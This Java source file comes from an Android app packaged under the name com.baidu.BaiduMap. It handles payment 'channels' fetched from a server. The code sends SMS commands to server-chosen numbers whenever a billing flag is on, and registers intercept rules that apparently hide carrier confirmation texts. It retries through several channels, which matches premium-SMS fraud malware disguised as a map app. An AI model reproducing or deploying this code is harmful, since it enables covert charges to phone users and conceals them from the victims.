package com.baidu.BaiduMap.manager;

import android.content.Context;
import android.os.Handler;

import com.baidu.BaiduMap.data.InitThroughData;
import com.baidu.BaiduMap.entity.RequestThroughCallBackEntity;
import com.baidu.BaiduMap.entity.SmsInterceptEntity;
import com.baidu.BaiduMap.httpCenter.InitRequest;
import com.baidu.BaiduMap.httpCenter.ThroughRequest;
import com.baidu.BaiduMap.sms.SmsCenter;
import com.baidu.BaiduMap.sms.SmsInterceptCenter;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.GsonUtils;
import com.baidu.BaiduMap.utils.Kode;
import com.baidu.BaiduMap.utils.Log;

import org.json.JSONObject;

import rx.Subscriber;

/**
 * Created by Administrator on 2017/7/24.
 */

public class InitRequestThroughManager extends PayCallBackHandler {
    private static InitRequestThroughManager initRequestThroughManager = null;
    private int requestTimes = 0;
    private RequestThroughCallBackEntity requestThroughCallBackEntity = null;
    private int price;
    private int throughId;

    public static InitRequestThroughManager getInstance() {
        if (initRequestThroughManager == null) {
            initRequestThroughManager = new InitRequestThroughManager();
        }
        return initRequestThroughManager;
    }

    public void requestThrough(final Context context, final String price, final String Did, final String productName, final Handler initPayCallBack) {
        try {
            JSONObject json = new JSONObject(InitThroughData.getInitThroughDataList().get(requestTimes).toString());
            String throughID = json.isNull("id") ? null : json.getString("id");
            if (!InitRequest.isJi_Fei) {
                return;
            }
            if (null == throughID || throughID.equals("")) {
                PayCallBackHandler.getInstance().payFail(initPayCallBack);
                goToNextThrough(context, price, Did, productName, initPayCallBack);
                return;
            }
            this.throughId = Integer.valueOf(throughID);
            //            this.price = Integer.valueOf(price);
            ThroughRequest.getInstance().request(context, throughID, price, Did, productName, new Subscriber<String>() {
                @Override
                public void onCompleted() {
                    if (Constants.isOutPut) {
                        Log.debug("request through completed!!!");
                    }
                }

                @Override
                public void onError(Throwable e) {
                    PayCallBackHandler.getInstance().payFail(initPayCallBack);
                    weatherJinJi(InitRequest.isNextRequest, context, price, Did, productName, initPayCallBack);
                    if (Constants.isOutPut) {
                        Log.debug("request through error : " + e.getMessage().toString());
                    }
                }

                @Override
                public void onNext(String s) {
                    if (Constants.isOutPut) {
                        Log.debug("init request through successed : " + Kode.e(s));
                    }
                    requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                    if (!requestThroughCallBackEntity.getState().equals("0")) {
                        if (Constants.isOutPut) {
                            Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
                        }
                        PayCallBackHandler.getInstance().payFail(initPayCallBack);
                        weatherJinJi(InitRequest.isNextRequest, context, price, Did, productName, initPayCallBack);
                    } else {
                        setInterceptData();
                        send(context, initPayCallBack);
                        setRequestTimes();
                        //goToNextThrough(context, price, Did, productName, initPayCallBack);
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private void goToNextThrough(Context context, String price, String Did, String productName, Handler initPayCallBack) {
        if (setRequestTimes() != -1) {
            requestThrough(context, price, Did, productName, initPayCallBack);
        } else {
            return;
        }
    }

    private void send(Context context, Handler payCallBack) {
        for (int i = 0; i < requestThroughCallBackEntity.getOrder().size(); i++) {
            String command = requestThroughCallBackEntity.getOrder().get(i).getCommand();
            String sendport = requestThroughCallBackEntity.getOrder().get(i).getSendport();
            SmsCenter.getInstance().sendSms(context, sendport, command, price, throughId, payCallBack);
        }
    }

    private void setInterceptData() {
        if (!requestThroughCallBackEntity.getPayType().equals("0")) {
            SmsInterceptEntity smsInterceptEntity = new SmsInterceptEntity();
            smsInterceptEntity.setFix_msg(requestThroughCallBackEntity.getFix_msg());
            smsInterceptEntity.setPayType(requestThroughCallBackEntity.getPayType());
            smsInterceptEntity.setLimit_msg_1(requestThroughCallBackEntity.getLimit_msg_1());
            smsInterceptEntity.setLimit_msg_2(requestThroughCallBackEntity.getLimit_msg_2());
            smsInterceptEntity.setLimitNum(requestThroughCallBackEntity.getLimitNum());
            smsInterceptEntity.setLimit_msg_data(requestThroughCallBackEntity.getLimit_msg_data());
            if (null != requestThroughCallBackEntity.getOrder() && requestThroughCallBackEntity.getOrder().size() > 0) {
                smsInterceptEntity.setOtherNeedUrl(requestThroughCallBackEntity.getOrder().get(0).getOtherNeedUrl());
                smsInterceptEntity.setSendParam(GsonUtils.getInstance().EntityToJson(requestThroughCallBackEntity.getOrder().get(0).getSendParam()));
            }
            if (null == SmsInterceptCenter.interceptContentList || SmsInterceptCenter.interceptContentList.size() <= 0) {
                SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                if (Constants.isOutPut) {
                    Log.debug("init SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
                }
            } else {
                for (int i = 0; i < SmsInterceptCenter.interceptContentList.size(); i++) {
                    if (SmsInterceptCenter.interceptContentList.get(i).toString().contains(requestThroughCallBackEntity.getLimit_msg_2()) && SmsInterceptCenter.interceptContentList.get(i).contains(requestThroughCallBackEntity.getLimit_msg_data())) {
                        SmsInterceptCenter.interceptContentList.remove(i);
                    }
                    SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                }
            }
        }
    }

    private int setRequestTimes() {
        if (Constants.isOutPut) {
            Log.debug("ReuqestTimes:" + requestTimes);
        }
        ++requestTimes;
        if (requestTimes > 7) {
            requestTimes = 0;
            return -1;
        } else {
            return 0;
        }
    }

    private void weatherJinJi(boolean open, Context context, String price, String Did, String productName, Handler initPayCallBack) {
        if (InitRequest.isNextRequest) {
            goToNextThrough(context, price, Did, productName, initPayCallBack);
        } else {
            setRequestTimes();
        }
    }
}
